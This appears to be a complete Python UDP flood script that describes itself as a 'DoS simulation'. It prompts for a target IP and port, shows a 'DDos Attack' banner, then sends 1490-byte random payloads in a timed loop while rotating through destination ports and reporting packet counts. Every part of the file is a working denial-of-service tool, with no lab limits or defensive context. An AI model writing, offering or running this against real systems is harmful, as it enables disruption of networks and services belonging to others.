import os
import time
import socket
import random
import argparse

def print_progress_bar(percent):
    bar_length = 20
    filled_length = int(bar_length * percent // 100)
    bar = '=' * filled_length + ' ' * (bar_length - filled_length)
    print(f"[{bar}] {percent}%")

def main():
    parser = argparse.ArgumentParser(description="Simple UDP packet sender (DoS simulation)")
    parser.add_argument('--ip', type=str, help='Target IP address')
    parser.add_argument('--port', type=int, help='Target port number', default=80)
    parser.add_argument('--duration', type=int, help='Attack duration in seconds', default=30)
    args = parser.parse_args()

    # Interactive fallback if not provided
    ip = args.ip or input("IP Target      : ")
    port = args.port or int(input("Port           : "))
    duration = args.duration

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)

    os.system("clear")
    os.system("figlet DDos Attack")

    print("Preparing attack...")
    for percent in [0, 25, 50, 75, 100]:
        print_progress_bar(percent)
        time.sleep(1)

    print("Attack started!")
    sent = 0
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            port = port + 1 if port < 65534 else 1
            if sent % 100 == 0:
                print(f"Sent {sent} packets to {ip} through port:{port}")
        except Exception as e:
            print(f"Error: {e}")
            break
    print(f"Attack finished. Total packets sent: {sent}")

if __name__ == "__main__":
    main()

